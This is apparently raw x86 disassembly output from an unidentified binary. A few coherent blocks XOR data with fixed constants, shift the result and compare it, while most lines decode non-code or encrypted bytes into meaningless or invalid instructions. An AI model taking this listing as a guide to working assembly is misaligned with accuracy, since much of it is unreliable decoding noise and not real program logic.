  405e57:	ja     0x405ec1
  405e59:	pop    edi
  405e5a:	outs   dx,BYTE PTR ds:[esi]
  405e5b:	lods   eax,DWORD PTR ds:[esi]
  405e5c:	mov    ebp,edx
  405e5e:	add    al,0x37
  405e60:	mov    ecx,DWORD PTR [esi+0x4]
  405e63:	mov    ecx,eax
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	fnstsw WORD PTR ds:[ebx+0x46]
  405e89:	add    bl,ch
  405e8b:	mov    esi,0xbdbebe2d
  405e90:	les    edi,FWORD PTR [esi-0x2826a142]
  405e96:	mov    WORD PTR [ecx],ds
  405e98:	and    ebx,DWORD PTR [edx-0x8]
  405e9b:	outs   dx,BYTE PTR es:[esi]
  405e9d:	xor    al,0x62
  405e9f:	push   0xef18a8f5
  405ea4:	mov    dl,0x48
  405ea6:	mov    eax,ds:0x29d49ad1
  405eab:	shl    BYTE PTR [eax-0x78],cl
  405eae:	lahf   
  405eaf:	ja     0x405f1e
  405eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb2:	sbb    DWORD PTR [bp+si],0xe386091d
  405eb9:	sbb    DWORD PTR [ecx-0x7082424b],ecx
  405ebf:	mov    esi,0xc8104533
  405ec4:	jns    0x405f30
  405ec6:	(bad)  
  405ec7:	jnp    0x405ec3
  405ec9:	sbb    ah,bl
  405ecb:	sti    
  405ecc:	mov    eax,ds:0x44820469
  405ed1:	lahf   
  405ed2:	aas    
  405ed3:	nop
  405ed4:	outs   dx,BYTE PTR ds:[esi]
  405ed5:	test   BYTE PTR [esi+0x312aeec],bh
  405edb:	into   
  405edc:	mov    ds:0x19a3b803,al
  405ee1:	inc    edx
  405ee2:	jo     0x405ed9
  405ee4:	sbb    edx,ebp
  405ee6:	call   0xbb29:0xd47b6f56
  405eed:	push   0xb75fe3bc
  405ef2:	mov    ah,0x13
  405ef4:	add    eax,0xaefa32cc
  405ef9:	xor    ecx,DWORD PTR [esi-0x1c]
  405efc:	xchg   ecx,eax
  405efd:	push   es
  405efe:	dec    eax
  405eff:	jne    0x405f5b
  405f01:	loope  0x405f67
  405f03:	lds    ecx,FWORD PTR [esi]
  405f05:	cwde   
  405f06:	aaa    
  405f07:	sar    BYTE PTR [edx+0x17],1
  405f0a:	int3   
  405f0b:	mov    dl,0x71
  405f0d:	fadd   QWORD PTR [edi+0x16]
  405f10:	pop    es
  405f11:	mov    ah,0xb5
  405f13:	mov    dh,0x3e
  405f15:	or     eax,0x49bd11ae
  405f1a:	into   
  405f1b:	add    al,0x21
  405f1d:	stos   DWORD PTR es:[edi],eax
  405f1e:	sub    DWORD PTR [ebx-0x3383d52f],esp
  405f24:	pop    ebx
  405f25:	lods   al,BYTE PTR ds:[esi]
  405f26:	lods   al,BYTE PTR ds:[esi]
  405f27:	fiadd  DWORD PTR [edx]
  405f29:	dec    ebp
  405f2a:	xchg   edi,eax
  405f2b:	mov    bl,0xf5
  405f2d:	test   DWORD PTR [edx],esi
  405f2f:	lahf   
  405f30:	int    0xaa
  405f32:	aad    0x17
  405f34:	xor    bl,0x51
  405f37:	loopne 0x405f90
  405f39:	pop    eax
  405f3a:	and    al,BYTE PTR [ebx+eax*1-0x63dcef60]
  405f41:	bound  ecx,QWORD PTR [edx]
  405f43:	jno    0x405efc
  405f45:	shl    BYTE PTR [ebx],1
  405f47:	or     eax,0xfb67887a
  405f4c:	lods   eax,DWORD PTR ds:[esi]
  405f4d:	inc    edx
  405f4e:	mov    gs,WORD PTR [ecx]
  405f50:	pop    ds
  405f51:	pop    edx
  405f52:	pop    esp
  405f53:	mov    eax,DWORD PTR [ecx-0x5]
  405f56:	fs mov ecx,0xc905c35a
  405f5d:	cmova  edi,DWORD PTR [eax+0x58f4e852]
  405f64:	repnz out dx,eax
  405f66:	sti    
  405f67:	retf   
  405f68:	in     eax,dx
  405f69:	xor    esi,DWORD PTR [ebx]
  405f6b:	cmp    bh,BYTE PTR [ecx+0x69ea53d4]
  405f71:	retf   
  405f72:	pop    ecx
  405f73:	jp     0x405f3c
  405f75:	(bad)  
  405f76:	in     eax,dx
  405f77:	in     eax,dx
  405f78:	std    
  405f79:	adc    eax,0x705c17e2
  405f7e:	scas   eax,DWORD PTR es:[edi]
  405f7f:	mov    ds:0xacb8d4f2,eax
  405f84:	out    0x46,al
  405f86:	bound  edx,QWORD PTR [edx]
  405f88:	icebp  
  405f89:	jle    0x405fc5
  405f8b:	dec    edx
  405f8c:	pop    ecx
  405f8d:	imul   BYTE PTR [ebx-0x7bb25876]
  405f93:	fnstsw WORD PTR [edi+esi*2]
  405f96:	or     esp,ebp
  405f98:	push   esi
  405f99:	xor    eax,0x2abb11ee
  405f9e:	in     eax,dx
  405f9f:	mov    ebp,0x8d5365de
  405fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa5:	push   ss
  405fa6:	call   0x5d10c1dc
  405fab:	imul   ecx,DWORD PTR [ecx-0x48],0x6dfeab7
  405fb2:	add    DWORD PTR [esi],esp
  405fb4:	push   0xffffffd7
  405fb6:	test   al,0x78
  405fb8:	inc    ebp
  405fb9:	sbb    BYTE PTR [ecx+0x58],dh
  405fbc:	cli    
  405fbd:	bound  ebp,QWORD PTR ds:0xf52dbf69
  405fc3:	sbb    eax,0x72ccb673
  405fc8:	sub    ebp,DWORD PTR [ecx]
  405fca:	sbb    ebp,DWORD PTR [ebx-0x39d520b7]
  405fd0:	add    al,0xbf
  405fd2:	sbb    DWORD PTR [ebx-0x18],ebx
  405fd5:	aad    0xcb
  405fd7:	xor    eax,0x579acee7
  405fdc:	jg     0x405f8d
  405fde:	mov    bl,0xea
  405fe0:	sbb    DWORD PTR [esi],ecx
  405fe2:	js     0x40604f
  405fe4:	(bad)  
  405fe5:	hlt    
  405fe6:	mov    al,ds:0xb16f4c86
  405feb:	shl    BYTE PTR [edx],0x73
  405fee:	mov    cl,0x7e
  405ff0:	cmp    bl,BYTE PTR [esi]
  405ff2:	(bad)
  405ff7:	jmp    0x96cd:0xc48570e5
  405ffe:	pop    ecx
  405fff:	(bad)  
  406000:	push   es
  406001:	push   edx
  406002:	call   0x81af:0xa4ffd0
  406009:	jg     0x406058
  40600b:	aas    
  40600c:	add    eax,0xb31d8599
  406011:	aad    0x74
  406013:	js     0x405fb2
  406015:	jnp    0x405ff4
  406017:	into   
  406018:	popa   
  406019:	adc    ch,BYTE PTR [edi]
  40601b:	jmp    0x5865:0xcfab61f7
  406022:	jbe    0x405fdc
  406024:	fidivr DWORD PTR [ebx]
  406026:	sbb    esp,DWORD PTR [ebp+0x22904f76]
  40602c:	jl     0x406046
  40602e:	test   esi,ecx
  406030:	ss aad 0x8b
  406033:	mov    al,0xc3
  406035:	push   ss
  406036:	add    bl,0x2f
  406039:	adc    DWORD PTR [esi],0x3f
  40603c:	mov    bh,0x9f
  40603e:	mov    ds:0x47da1abc,al
  406043:	ss mov bh,0xad
  406046:	ss pop ecx
  406048:	(bad)  
  406049:	pop    esi
  40604a:	mov    eax,0x21acb96a
  40604f:	mov    eax,ds:0xd158b7dd
  406054:	iret   
  406055:	adc    BYTE PTR [ebp+0x46f5973d],ah
  40605b:	xchg   BYTE PTR [ebx],dl
  40605d:	xchg   BYTE PTR [edx-0x24846803],dh
  406063:	in     eax,dx
  406064:	push   ebp
  406065:	stos   DWORD PTR es:[edi],eax
  406066:	lods   eax,DWORD PTR ds:[esi]
  406067:	repnz sti 
  406069:	imul   eax,DWORD PTR [edx],0xa4aec700
  40606f:	shl    DWORD PTR [edi+0x17a53ac7],1
  406075:	enter  0x38e7,0xa8
  406079:	cmc    
  40607a:	fld    TBYTE PTR [esi]
  40607c:	lds    esi,FWORD PTR [esi]
  40607e:	iret   
  40607f:	test   esi,eax
  406081:	aas    
  406082:	in     eax,dx
  406083:	and    ebx,esp
  406085:	inc    edx
  406086:	xchg   esi,edx
  406088:	fmul   st,st(1)
  40608a:	mov    ebx,0x59334203
  40608f:	add    BYTE PTR [ecx+0x21a38648],dl
  406095:	fwait
  406096:	fs dec ebp
  406098:	in     al,dx
  406099:	fisub  DWORD PTR [esi]
  40609b:	add    ebp,DWORD PTR ds:0xb4b4c71b
  4060a1:	push   cs
  4060a2:	jae    0x406059
  4060a4:	fdivr  QWORD PTR [edx]
  4060a6:	mov    ah,0x1a
  4060a8:	add    DWORD PTR [ebp-0xe],0xd
  4060ac:	mov    ah,0xe6
  4060ae:	pusha  
  4060af:	xchg   edx,eax
  4060b0:	inc    ecx
  4060b1:	cli    
  4060b2:	(bad)  
  4060b4:	mul    BYTE PTR [ebx]
  4060b6:	push   ecx
  4060b7:	fild   DWORD PTR ds:0x8d6b11b2
  4060bd:	and    al,BYTE PTR [edx]
  4060bf:	in     al,dx
  4060c0:	push   edx
  4060c1:	int3   
  4060c2:	addr16 and eax,0x40c4a17f
  4060c8:	adc    eax,0xed51ff80
  4060cd:	cmp    BYTE PTR [eax],ch
  4060cf:	cs shl ah,1
  4060d2:	int    0xd7
  4060d4:	sbb    eax,0x45926ad2
  4060d9:	jle    0x406117
  4060db:	or     ah,BYTE PTR [edi+ebx*1]
  4060de:	lds    edx,FWORD PTR [ebx-0x79]
  4060e1:	retf   
  4060e2:	mov    al,ds:0xba7e3014
  4060e7:	idiv   DWORD PTR [esp+ebx*4]
  4060ea:	aas    
  4060eb:	inc    edi
  4060ec:	cld    
  4060ed:	mov    bh,0x70
  4060ef:	into   
  4060f0:	inc    ebx
  4060f1:	adc    BYTE PTR [ecx+ebp*4+0x7c],0xaa
  4060f6:	icebp  
  4060f7:	add    al,0x17
  4060f9:	fcom   QWORD PTR [edi]
  4060fb:	scas   al,BYTE PTR es:[edi]
  4060fc:	dec    edi
  4060fd:	and    bl,dh
  4060ff:	cmp    BYTE PTR [edx-0x67],cl
  406102:	xchg   esp,eax
  406103:	nop
  406104:	sbb    eax,0x246b630f
  406109:	adc    BYTE PTR [edi+0x77],dh
  40610c:	int3   
  40610d:	add    bl,BYTE PTR [eax-0x8]
  406110:	inc    eax
  406111:	mov    al,0x90
  406113:	xchg   esp,eax
  406114:	fld1   
  406116:	add    al,0x9a
  406118:	dec    eax
  406119:	or     ah,ah
  40611b:	ja     0x40619b
  40611d:	mov    ds:0xb19ea01f,al
  406122:	ins    DWORD PTR es:[edi],dx
  406123:	add    al,0x90
  406125:	in     al,dx
  406126:	lahf   
  406127:	int    0x4f
  406129:	sbb    BYTE PTR [ecx+0x4c],dh
  40612c:	xchg   DWORD PTR [ecx],ebp
  40612e:	repz xor ebp,ebx
  406131:	imul   ecx,DWORD PTR [edx],0xfbc13c94
  406137:	fwait
  406138:	mov    eax,0xdead6771
  40613d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40613e:	test   eax,0x18da9b1f
  406143:	add    BYTE PTR [eax],al
  406145:	pop    esp
  406146:	mov    al,0x93
  406148:	in     eax,0xb0
  40614a:	in     al,0x95
  40614c:	jmp    0x4061b0
  40614e:	push   0x60
  406150:	sbb    esp,DWORD PTR [ebx-0x75]
  406153:	mov    bh,0x58
  406155:	cmp    dh,BYTE PTR ds:0x21ef82e2
  40615b:	out    dx,al
  40615c:	xchg   ebx,eax
  40615d:	pusha  
  40615e:	jecxz  0x40613f
  406160:	repnz stos DWORD PTR es:[edi],eax
  406162:	mov    edx,0x3389f238
  406167:	push   esi
  406168:	xchg   BYTE PTR [edx],bl
  40616a:	mov    ebp,0xef567243
  40616f:	cld    
  406170:	jle    0x406128
  406172:	sbb    BYTE PTR [esi+0x365026d2],bh
  406178:	lahf   
  406179:	(bad)  
  40617b:	std    
  40617c:	dec    esp
  40617d:	or     BYTE PTR [eax+ebx*2+0x556f6ce9],dl
  406184:	mov    dh,0xd0
  406186:	iret   
  406187:	add    DWORD PTR [ebx-0x63],eax
  40618a:	ret    
  40618b:	mov    ah,0xc4
  40618d:	loop   0x40611f
  40618f:	push   edx
  406190:	or     bh,BYTE PTR [ebx+0x25]
  406193:	out    0xfb,eax
  406195:	sub    BYTE PTR [eax-0x7b706900],0xe3
  40619c:	xchg   DWORD PTR [eax],esi
  40619e:	popa   
  40619f:	push   edx
  4061a0:	retf   
  4061a1:	int    0xc7
  4061a3:	and    bl,BYTE PTR [eax-0x69]
  4061a6:	dec    esp
  4061a7:	and    eax,0x33d0fb6e
  4061ac:	pop    esp
  4061ad:	leave  
  4061ae:	xor    dl,dl
  4061b0:	cwde   
  4061b1:	lahf   
  4061b2:	loop   0x406230
  4061b4:	push   ds
  4061b5:	loopne 0x4061be
  4061b7:	mov    al,0x13
  4061b9:	xchg   BYTE PTR [edx+0x19],bl
  4061bc:	cmp    ebx,0xfffffffe
  4061bf:	adc    eax,0xeb5341f8
  4061c4:	mov    cl,0x83
  4061c6:	cwde   
  4061c7:	mov    ah,0x5b
  4061c9:	fisttp WORD PTR [edi]
  4061cb:	fstp   QWORD PTR [edi+0x692630a0]
  4061d1:	xchg   ebp,eax
  4061d2:	jbe    0x406203
  4061d4:	adc    BYTE PTR [eax-0x80],bh
  4061d7:	cli    
  4061d8:	cmp    eax,0x4d15b5b6
  4061dd:	fsubr  QWORD PTR [edi+eiz*1-0x67]
  4061e1:	imul   ebx,ecx,0xfffffff0
  4061e4:	adc    ch,BYTE PTR [ebp-0x70]
  4061e7:	pop    esi
  4061e8:	jns    0x4061a5
  4061ea:	ins    BYTE PTR es:[edi],dx
  4061eb:	sar    BYTE PTR [eax],1
  4061ed:	mov    al,0x16
  4061ef:	std    
  4061f0:	cwde   
  4061f1:	sub    ebx,ecx
  4061f3:	and    BYTE PTR [esi],0x7a
  4061f6:	cmp    DWORD PTR [esi+0x42],eax
  4061f9:	or     ch,BYTE PTR [ebx-0x7c29ca5f]
  4061ff:	jnp    0x40627b
  406201:	xchg   ecx,eax
  406202:	push   ss
  406203:	and    ecx,DWORD PTR [ecx-0x5e]
  406206:	adc    dl,BYTE PTR [eax]
  406208:	lods   al,BYTE PTR ds:[esi]
  406209:	or     BYTE PTR [ebx+ecx*2+0x469c5afa],bl
  406210:	add    esp,DWORD PTR gs:[ecx+0x67]
  406214:	in     al,0xdf
  406216:	jb     0x406199
  406218:	bnd call 0x81dc8da8
  40621e:	icebp  
  40621f:	ja     0x4061d6
  406221:	jns    0x4061ee
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	add    esi,edx
  4062ea:	sub    cl,dl
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi+0x621c05be]
  4062f7:	(bad)  [eax+0x42cb0f08]
  4062fd:	adc    al,0xb4
  4062ff:	fidiv  WORD PTR [esi-0x46]
  406302:	fisubr DWORD PTR [edi*4-0x226bd5d0]
  406309:	jmp    0x4da3:0xab1949df
  406310:	retf   
  406311:	add    DWORD PTR [edi+0x61],0x3267d1a4
  406318:	shl    BYTE PTR [ebx-0x413a123d],cl
  40631e:	xor    eax,DWORD PTR [eax+0x74]
  406321:	sub    BYTE PTR [ebp-0x2a],cl
  406324:	push   ebp
  406325:	aam    0x6f
  406327:	or     DWORD PTR [esi-0x3e],eax
  40632a:	dec    eax
  40632b:	enter  0x5cce,0xf9
  40632f:	or     DWORD PTR [esi+0x657cfedf],esi
  406335:	in     eax,0x62
  406337:	dec    ecx
  406338:	or     eax,0x54724e15
  40633d:	mov    ecx,0x2971a937
  406342:	xchg   edi,eax
  406343:	jle    0x40632f
  406345:	push   esi
  406346:	stos   DWORD PTR es:[edi],eax
  406347:	outs   dx,BYTE PTR ds:[esi]
  406348:	sbb    BYTE PTR [ebx+0x6ac886b],al
  40634e:	cmp    ecx,DWORD PTR [edx+0x68]
  406351:	iret   
  406352:	dec    esi
  406353:	push   0xffffff81
  406355:	cli    
  406356:	(bad)  
  406357:	stos   BYTE PTR es:[edi],al
  406358:	in     al,dx
  406359:	(bad)  
  40635a:	ret    0xe64c
  40635d:	pop    eax
  40635e:	in     al,0x1b
  406360:	ja     0x406312
  406362:	fwait
  406363:	sub    ebx,DWORD PTR ds:0xfb6677db
  406369:	dec    ecx
  40636a:	in     al,dx
  40636b:	push   esi
  40636c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40636d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40636e:	xchg   esp,eax
  40636f:	jae    0x40631e
  406371:	dec    esi
  406372:	pop    ebx
  406373:	inc    ecx
  406374:	jle    0x406313
  406376:	in     al,dx
  406377:	mov    DWORD PTR [esi],edi
  406379:	mov    edx,0xe8feb233
  40637e:	out    dx,al
  40637f:	shl    BYTE PTR [ebx-0xf],cl
  406382:	pop    eax
  406383:	sbb    BYTE PTR [edi],cl
  406385:	in     eax,dx
  406386:	mov    ecx,0xb72158fd
  40638b:	sbb    DWORD PTR [edx-0x52f5ede2],esi
  406391:	aam    0x82
  406393:	and    ebx,edx
  406395:	call   0x87a5d036
  40639a:	sbb    DWORD PTR [ebx],ebx
  40639c:	pop    ebp
  40639d:	loope  0x406409
  40639f:	dec    esi
  4063a0:	push   0x68944cb1
  4063a5:	xor    esi,DWORD PTR [esi+0x7]
  4063a8:	jnp    0x4063d2
  4063aa:	lea    eax,[ebp+0x7c]
  4063ad:	outs   dx,BYTE PTR ds:[esi]
  4063ae:	lods   al,BYTE PTR ds:[esi]
  4063af:	inc    edx
  4063b0:	ins    BYTE PTR es:[edi],dx
  4063b1:	fwait
  4063b2:	cmp    BYTE PTR [ecx],0xc7
  4063b5:	cmc    
  4063b6:	or     BYTE PTR gs:[eax-0x1b56725f],bh
  4063bd:	scas   al,BYTE PTR es:[edi]
  4063be:	int3   
  4063bf:	addr16 or ecx,ebp
  4063c2:	push   es
  4063c3:	cmp    esp,DWORD PTR [ebx]
  4063c5:	addr16 adc al,0x8b
  4063c8:	adc    edx,DWORD PTR [esp+ebx*1+0x5159b266]
  4063cf:	xor    DWORD PTR [ebp+edx*8-0x677a38d6],esp
  4063d6:	mov    ah,bl
  4063d8:	or     esi,edi
  4063da:	lds    ecx,FWORD PTR [esi]
  4063dc:	jecxz  0x4063a5
  4063de:	inc    ebx
  4063df:	daa    
  4063e0:	adc    ebp,DWORD PTR [eax]
  4063e2:	mov    dh,0xd6
  4063e4:	xchg   ecx,eax
  4063e5:	cmp    bl,BYTE PTR [eax+0x3a]
  4063e8:	mov    ch,0xcf
  4063ea:	test   BYTE PTR [ebx+0x3463d89e],ah
  4063f0:	jbe    0x4063fc
  4063f2:	inc    ecx
  4063f3:	dec    esp
  4063f4:	scas   eax,DWORD PTR es:[edi]
  4063f5:	in     al,dx
  4063f6:	xchg   ebp,eax
  4063f7:	and    cl,dl
  4063f9:	cmp    ecx,DWORD PTR [eax-0x7a68a84e]
  4063ff:	and    edi,DWORD PTR [ebx+0x4d4314eb]
  406405:	xor    DWORD PTR [edx+0x2a],edi
  406408:	les    esp,FWORD PTR [esi+edi*1+0x7360558d]
  40640f:	sbb    dl,ch
  406411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406412:	mov    bl,0xe5
  406414:	cmp    ecx,DWORD PTR [edx-0x4e6c28b4]
  40641a:	pop    es
  40641b:	mov    esp,0x7a142d80
  406420:	cwde   
  406421:	xlat   BYTE PTR ds:[ebx]
  406422:	mov    cl,BYTE PTR ds:0x8a9419c5
  406428:	xlat   BYTE PTR ds:[ebx]
  406429:	mov    ecx,0x9aa2d54e
  40642e:	inc    edi
  40642f:	shl    BYTE PTR [edi],1
  406431:	jnp    0x4063b6
  406433:	div    DWORD PTR [ebp-0x71]
  406436:	inc    ebx
  406437:	adc    BYTE PTR [ebp-0x49f841e9],dh
  40643d:	repnz test DWORD PTR [ecx+0x2475434a],0xf46615e0
  406448:	mov    ah,0xff
  40644a:	pop    ebx
  40644b:	gs pop ds
  40644d:	cmp    dh,ah
  40644f:	mov    ds:0x56527c44,al
  406454:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406456:	sbb    eax,0x37b85d84
  40645b:	ret    0xc889
  40645e:	pop    ds
  40645f:	and    DWORD PTR [edx],0x31579d90
  406465:	dec    ecx
  406466:	push   ds
  406467:	test   eax,0x8bd89ab1
  40646c:	ret    0x3249
  40646f:	cmp    ecx,ebx
  406471:	test   DWORD PTR [esp+eax*2+0x0],0xfcfa7d5b
  406479:	lahf   
  40647a:	lds    esp,FWORD PTR [edi+0x72f5e1ce]
  406480:	clc    
  406481:	sub    eax,0xa5b8a31c
  406486:	sbb    ebp,DWORD PTR [edx]
  406488:	aam    0x19
  40648a:	jo     0x40644b
  40648c:	sahf   
  40648d:	add    bh,BYTE PTR [ecx]
  40648f:	or     DWORD PTR [edx-0x3f96ae79],eax
  406495:	jns    0x406504
  406497:	outs   dx,DWORD PTR ds:[esi]
  406498:	in     al,dx
  406499:	mov    bl,0xd5
  40649b:	cs add al,bh
  40649e:	rcl    BYTE PTR [ecx],1
  4064a0:	jecxz  0x40650d
  4064a2:	enter  0x5ab2,0xb3
  4064a6:	stos   DWORD PTR es:[edi],eax
  4064a7:	call   0x9def:0x23155218
  4064ae:	sub    bl,cl
  4064b0:	int    0x32
  4064b2:	lods   al,BYTE PTR ds:[esi]
  4064b3:	xchg   ebp,eax
  4064b4:	arpl   WORD PTR [ebp-0x73],si
  4064b7:	cdq    
  4064b8:	mov    esp,0x9c8668ec
  4064bd:	ins    DWORD PTR es:[edi],dx
  4064be:	cmp    cl,BYTE PTR [edi-0x10]
  4064c1:	dec    esp
  4064c2:	dec    ebx
  4064c3:	jge    0x406543
  4064c5:	retf   
  4064c6:	dec    esp
  4064c7:	pop    ss
  4064c8:	add    DWORD PTR [ebx-0x2f601bd7],edx
  4064ce:	lds    edi,FWORD PTR [ebx]
  4064d0:	imul   esi,DWORD PTR [ebx+edx*2+0x4b46c7b8],0x5
  4064d8:	add    eax,0x879ab391
  4064dd:	mov    dl,BYTE PTR [ecx+0x37]
  4064e0:	mov    al,ds:0xd0a5cefb
  4064e5:	emms   
  4064e7:	lock and BYTE PTR [edi-0x8d760b0],dh
  4064ee:	mov    ss:0xaacfc373,al
  4064f4:	movlps xmm0,QWORD PTR [eax-0x5509c42f]
  4064fb:	aas    
  4064fc:	cmp    ebx,DWORD PTR [ebx-0xa]
  4064ff:	out    dx,eax
  406500:	and    DWORD PTR ds:0xd4d5f75c,0x41799ac2
  40650a:	test   eax,0xb94e491
  40650f:	jne    0x4064cd
  406511:	sub    DWORD PTR [edi],0x4a
  406514:	or     BYTE PTR [edx+0x65],0x7
  406518:	retf   
  406519:	hlt    
  40651a:	push   ds
  40651b:	pop    ecx
  40651c:	dec    esp
  40651d:	jg     0x406574
  40651f:	and    esi,DWORD PTR [esp+ebx*8-0x7f72aef0]
  406526:	and    DWORD PTR [esi],ebp
  406528:	retf   0x8c98
  40652b:	fdivr  st(5),st
  40652d:	aas    
  40652e:	inc    esi
  40652f:	push   0x11
  406531:	(bad)  
  406533:	dec    esp
  406534:	add    ah,BYTE PTR [ebx-0x2903ab0a]
  40653a:	jge    0x4064d2
  40653c:	ds popf 
  40653e:	pop    ebp
  40653f:	push   ecx
  406540:	or     DWORD PTR [ebx+edi*2+0x58],0x3faf62cc
  406548:	inc    ebp
  406549:	mov    ebx,DWORD PTR [edx+0xa1fbd39]
  40654f:	xor    BYTE PTR [ecx-0x51],cl
  406552:	loope  0x406505
  406554:	sbb    DWORD PTR [eax+0x2fe04fe6],0x7bcd4d6b
  40655e:	das    
  40655f:	inc    esp
  406560:	lods   ax,WORD PTR ds:[esi]
  406562:	fisttp QWORD PTR [esi-0x37]
  406565:	popf   
  406566:	cmp    dl,dl
  406568:	ret    
  406569:	(bad)  
  40656a:	jl     0x40650a
  40656c:	out    dx,eax
  40656d:	jb     0x406510
  40656f:	add    DWORD PTR [ebx-0x62],esi
  406572:	xchg   BYTE PTR [ecx],ah
  406574:	(bad)  
  406576:	push   edi
  406577:	imul   ecx,DWORD PTR [ebx+0x74222b2a],0xd35d0c7
  406581:	pop    ds
  406582:	fdivr  DWORD PTR [ebx-0x229d608e]
  406588:	jne    0x4065bc
  40658a:	popf   
  40658b:	in     eax,dx
  40658c:	push   ebx
  40658d:	adc    al,0x9e
  40658f:	and    al,0xff
  406591:	push   0x376e025a
  406596:	xchg   ecx,eax
  406597:	fsub   QWORD PTR [ecx+0x4a]
  40659a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40659b:	repnz outs dx,DWORD PTR ds:[esi]
  40659d:	aaa    
  40659e:	mov    edi,DWORD PTR [ebx+eiz*8-0x2f]
  4065a2:	xchg   edi,eax
  4065a3:	hlt    
  4065a4:	ja     0x406569
  4065a6:	jg     0x40660b
  4065a8:	mov    al,0x51
  4065aa:	inc    edx
  4065ab:	sbb    al,0x60
  4065ad:	jns    0x40656b
  4065af:	and    DWORD PTR [edx+0x4493731d],0xffffffdb
  4065b6:	mov    ch,0x6e
  4065b8:	xchg   DWORD PTR [edi-0x4fffd670],ecx
  4065be:	mov    ecx,0x2375cf21
  4065c3:	mov    ecx,DWORD PTR [edx]
  4065c5:	sbb    al,0x8c
  4065c7:	out    dx,eax
  4065c8:	jmp    0x4065d0
  4065ca:	push   esi
  4065cb:	mov    cl,0x2a
  4065cd:	cmp    bh,cl
  4065cf:	or     edi,DWORD PTR [eax+ebx*2-0x6be2051b]
  4065d6:	ds push ecx
  4065d8:	mov    al,ds:0xf6d47e31
  4065dd:	loop   0x406606
  4065df:	fcom   QWORD PTR [edx+0x53]
  4065e2:	xor    BYTE PTR [edx+ecx*1-0x8676ffd],0x3
  4065ea:	adc    edi,eax
  4065ec:	imul   ecx,eax,0x67
  4065ef:	cmp    al,0xac
  4065f1:	ss cmp eax,0xf2e90bf8
  4065f7:	pusha  
  4065f8:	je     0x406658
  4065fa:	je     0x406603
  4065fc:	call   0x7f60:0xb7ed2d3d
  406603:	jno    0x4065e7
  406605:	sub    al,0x45
  406607:	cmp    DWORD PTR [esi+0x4db2552e],0x28
  40660e:	test   DWORD PTR [ecx],ebx
  406610:	out    dx,al
  406611:	cmp    esi,DWORD PTR ss:[ebx]
  406614:	jne    0x406606
  406616:	add    al,0x93
  406618:	in     eax,dx
  406619:	mov    eax,ds:0xa23de8a6
  40661e:	pop    edx
  40661f:	hlt    
  406620:	std    
  406621:	dec    ebx
  406622:	fisub  DWORD PTR [edi+eiz*2+0x5df9f7dc]
  406629:	or     DWORD PTR [eax+eiz*4+0x3c0d437e],ecx
  406630:	in     eax,0x74
  406632:	adc    ebp,DWORD PTR [eax+0x75]
  406635:	outs   dx,BYTE PTR ds:[esi]
  406636:	jge    0x40668a
  406638:	mov    DWORD PTR [edx+0x57e8492],ebp
  40663e:	xchg   ecx,eax
  40663f:	je     0x406681
  406641:	in     eax,dx
  406642:	in     al,0x48
  406644:	aas    
  406645:	test   al,0x7c
